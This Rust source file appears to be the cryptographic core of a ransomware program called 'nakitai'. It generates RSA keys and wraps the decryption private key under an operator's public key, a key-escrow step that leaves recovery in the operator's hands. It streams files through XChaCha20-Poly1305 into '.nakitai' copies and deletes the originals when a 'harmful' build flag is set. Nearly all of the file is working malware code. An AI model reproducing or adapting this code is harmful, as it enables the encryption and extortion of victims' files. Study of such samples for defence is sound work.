use anyhow::anyhow;
use base64::encode;
use chacha20poly1305::{
    aead::{
        stream::{DecryptorBE32, EncryptorBE32},
        NewAead,
    },
    XChaCha20Poly1305,
};
#[allow(unused_imports)]
use openssl::{
    pkey::{Private, Public},
    rand::rand_bytes,
    rsa::{Padding, Rsa},
    symm::{decrypt, encrypt, Cipher},
};
use std::io::Read;
use std::{
    fs::{remove_file, File},
    io::Write,
    path::Path,
};

// This is gonna be done with the `extract_decrypt_key_nky.js`
#[cfg(debug_assertions)]
pub fn decrypt_private_key(
    og_public_key_size: usize,
    og_private_key: &Rsa<Private>,
    encrypted_nakitai_key: &Vec<u8>,
) -> Result<Rsa<Private>, anyhow::Error> {
    let key_ciphertext = &encrypted_nakitai_key[..og_public_key_size];
    let iv = &encrypted_nakitai_key[og_public_key_size..og_public_key_size + 16];
    let ciphertext = &encrypted_nakitai_key[og_public_key_size + 16..];

    println!("\n<===== decrypt_private_key =====>\n");
    println!("key_ciphertext => {:?}", key_ciphertext);

    let mut key: Vec<u8> = vec![0u8; og_private_key.size() as usize];

    og_private_key.private_decrypt(&key_ciphertext, &mut key, Padding::PKCS1_OAEP)?;

    key.resize(32, 0u8);
    println!("key => {:?}", key);

    let private_key_pem = decrypt(Cipher::aes_256_cbc(), &key, Some(&iv), &ciphertext)?;
    let private_key = Rsa::private_key_from_pem(&private_key_pem.as_slice())?;

    Ok(private_key)
}

pub fn encrypt_private_key(
    file_path: &str,
    og_public_key: &Rsa<Public>,
    private_key: &Rsa<Private>,
) -> Result<(), anyhow::Error> {
    let mut key = [0u8; 32];
    let mut iv = [0u8; 16];
    let safeword: [u8; 3] = [0x48, 0x34, 0x6B];

    rand_bytes(&mut key)?;
    rand_bytes(&mut iv)?;

    let mut key_ciphertext = vec![0u8; og_public_key.size() as usize];
    let private_key_pem = private_key.private_key_to_pem()?;
    let mut dest_file = File::create(file_path)?;

    #[cfg(debug_assertions)]
    {
        println!("==== nky key generation ====");
        println!("key [({:?})] => {:?}", key.len(), key);
        println!("iv [({:?})] => {:?}", iv.len(), iv);
        println!("safeword [({:?})] => {:?}", safeword.len(), safeword);
        println!(
            "private_key_pem [({:?})] => {:?}",
            private_key_pem.len(),
            private_key_pem
        );
    }

    og_public_key.public_encrypt(&key, &mut key_ciphertext, Padding::PKCS1_OAEP)?;

    let private_key_ciphertext = encrypt(
        Cipher::aes_256_cbc(),
        &key,
        Some(&iv),
        &private_key_pem.as_slice(),
    )?;

    let c = [
        &key_ciphertext[..],
        &safeword[..],
        &iv[..],
        &private_key_ciphertext[..],
    ]
    .concat();

    #[cfg(debug_assertions)]
    {
        println!("==== nky key encryption ====");
        println!(
            "key_ciphertext [({:?})] => {:?}",
            key_ciphertext.len(),
            key_ciphertext
        );
        println!("iv [({:?})] => {:?}", iv.len(), iv);
        println!(
            "private_key_ciphertext [({:?})] => {:?}",
            private_key_ciphertext.len(),
            private_key_ciphertext
        );
    }

    let key_ciphertext_encoded = encode(&c);

    dest_file.write(&key_ciphertext_encoded.as_bytes())?;

    Ok(())
}

pub fn gen_key_pair(size: u32) -> Result<(Rsa<Public>, Rsa<Private>), anyhow::Error> {
    let rsa = Rsa::generate(size)?;

    let public_key_pem = rsa.public_key_to_pem()?;
    let private_key_pem = rsa.private_key_to_pem()?;

    let public_key = Rsa::public_key_from_pem(&public_key_pem.as_slice())?;
    let private_key = Rsa::private_key_from_pem(&private_key_pem.as_slice())?;

    Ok((public_key, private_key))
}

pub fn encrypt_file(file_path: &str, public_key: &Rsa<Public>) -> Result<String, anyhow::Error> {
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 19];

    rand_bytes(&mut key)?;
    rand_bytes(&mut nonce)?;

    let mut source_file = File::open(file_path)?;
    let dest_file_name = format!("{}{}", file_path, ".nakitai");
    let mut dest_file = File::create(&dest_file_name)?;

    const BUFFER_LEN: usize = 1024;
    let mut buffer = [0u8; BUFFER_LEN];
    let mut key_ciphertext: Vec<u8> = vec![0u8; public_key.size() as usize];

    public_key.public_encrypt(&key, &mut key_ciphertext, Padding::PKCS1_OAEP)?;

    /*println!(
        "key_ciphertext [({:?})] => {:?}",
        key_ciphertext.len(),
        key_ciphertext
    );*/

    let aead = XChaCha20Poly1305::new(key.as_ref().into());

    let mut stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());

    dest_file.write(&key_ciphertext)?;
    dest_file.write(&nonce)?;
    dest_file.write(&[0x48, 0x34, 0x6B])?;

    loop {
        let read_count = source_file.read(&mut buffer)?;

        if read_count == BUFFER_LEN {
            let ciphertext = stream_encryptor
                .encrypt_next(&buffer[..])
                .map_err(|err| anyhow!("Encrypting large file: {}", err))?;
            dest_file.write(&ciphertext)?;
        } else {
            let ciphertext = stream_encryptor
                .encrypt_last(&buffer[..read_count])
                .map_err(|err| anyhow!("Encrypting large file: {}", err))?;
            dest_file.write(&ciphertext)?;
            break;
        }
    }

    #[cfg(not(feature = "harmful"))]
    {
        #[cfg(debug_assertions)]
        {
            println!("Encrypted => {:?}", file_path);
        }
    }

    #[cfg(feature = "harmful")]
    {
        #[cfg(debug_assertions)]
        {
            println!("Encrypted & Del => {:?}", file_path);
        }
        remove_file(file_path)?;
    }

    Ok(dest_file_name)
}

pub fn decrypt_file(
    file_path: &str,
    public_key_len: usize,
    private_key: &Rsa<Private>,
) -> Result<(), anyhow::Error> {
    let mut source_file = File::open(file_path)?;

    let dest_file_name = Path::new(file_path).with_extension("").into_os_string();
    let mut dest_file = File::create(&dest_file_name)?;

    let mut key: Vec<u8> = vec![0u8; private_key.size() as usize];
    let mut key_ciphertext = vec![0u8; public_key_len];
    let mut nonce = [0u8; 19];
    let mut safeword = [0u8; 3];

    let _ = source_file.read(&mut key_ciphertext)?;
    let _ = source_file.read(&mut nonce)?;
    let _ = source_file.read(&mut safeword)?;

    /*println!(
        "key_ciphertext [({:?})] => {:?}",
        key_ciphertext.len(),
        key_ciphertext
    );*/

    private_key.private_decrypt(&key_ciphertext, &mut key, Padding::PKCS1_OAEP)?;

    key.resize(32, 0u8);

    /*println!("key      => {:?}", key);
    println!("nonce    => {:?}", nonce);
    println!("safeword => {:?}", safeword);*/

    let aead = XChaCha20Poly1305::new(key.as_slice().into());

    let mut stream_decryptor = DecryptorBE32::from_aead(aead, nonce.as_ref().into());

    // 16 bytes of authentication code
    const BUFFER_LEN: usize = 1024 + 16;
    let mut buffer = [0u8; BUFFER_LEN];

    loop {
        let read_count = source_file.read(&mut buffer)?;

        if read_count == BUFFER_LEN {
            let plaintext = stream_decryptor
                .decrypt_next(&buffer[..])
                .map_err(|err| anyhow!("Error decrypting large file: {}", err))?;
            dest_file.write(&plaintext)?;
        } else if read_count == 0 {
            break;
        } else {
            let plaintext = stream_decryptor
                .decrypt_last(&buffer[..read_count])
                .map_err(|err| anyhow!("Error decrypting large file: {}", err))?;
            dest_file.write(&plaintext)?;
            break;
        }
    }

    remove_file(&file_path)?;

    #[cfg(debug_assertions)]
    {
        println!("Decrypted => {:?}", file_path);
    }

    Ok(())
}
